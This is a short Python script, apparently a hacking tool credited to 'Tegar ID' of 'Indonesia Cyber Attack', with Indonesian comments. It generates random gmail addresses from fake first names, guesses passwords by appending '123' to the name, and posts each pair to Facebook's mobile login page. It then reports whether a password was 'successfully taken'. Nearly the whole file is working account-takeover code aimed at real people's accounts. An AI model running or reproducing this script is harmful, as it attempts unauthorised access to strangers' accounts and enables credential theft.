# Module yang di butuhkan
import requests
import random, os
from faker import Faker

os.system("clear")

# banner

logo = ("""

  ◕ ▬▬▬▬▬▬▬(Indonesia Cyber Attack)▬▬▬▬▬◕
______███████  ─╔═╗╔╗──────────╔══╗╔╗────────╔╗─
______█▄███▄█  ─║╔╝║║──────────║╔╗║║║───────╔╝╚╗
______█▼▼▼▼▼█  ╔╝╚╗║╚═╗╔══╗╔╗╔╗║╚╝║║║─╔══╗╔╗╚╗╔╝
_____██▌___██▌ ╚╗╔╝║╔╗║║║═╣╚╬╬╝║╔═╝║║─║╔╗║─╣─║║─
______█▲▲▲▲▲█  ─║║─║╚╝║║║═╣╔╬╬╗║║──║╚╗║╚╝║║║─║╚╗
______███████  ─╚╝─╚══╝╚══╝╚╝╚╝╚╝──╚═╝╚══╝╚╝─╚═╝
_______██_██        Autho : Tegar ID
""")

print(logo)

# Mendapat Email Pengguna

generated = Faker()
FN = generated.first_name().lower()
initial_num = str(random.randint(0, 100))
email = FN + initial_num + '@gmail.com'
print('Email : ' + email)

# Generated Password

password = FN.lower() + '123'
print('Password test : ' + password)

# Coba Login di Facebook

url = 'https://m.facebook.com/login/'
data = {
    'email':email,
    'pass':password
}

req = requests.Session()
get = req.get(url)
post = req.post(url, data=data).text

if 'tidak sepadan' in post:
    print('Akun facebook tidak ada')
elif 'checkpoint_data' in post:
    print('Akun checkpoint')
elif 'tidak betul' in post:
    print('Password salah')
else:
    print('Password Sukses Di Ambil')

print("\n[u] Ulang\n[k] Keluar")
balik = input("Pilih : ")
if balik == "u" or balik == "U":
    os.system("python fbhek.py")
elif balik == "k" or balik == "K":
    os.system("clear")
    print("Thanks To Use My Tools")
    print("Tegar ID and My Team Indonesia Cyber Attack")
else :
    os.system("clear")
    print("Thanks To Use My Tools")
    print("Tegar ID and My Team Indonesia Cyber Attack")
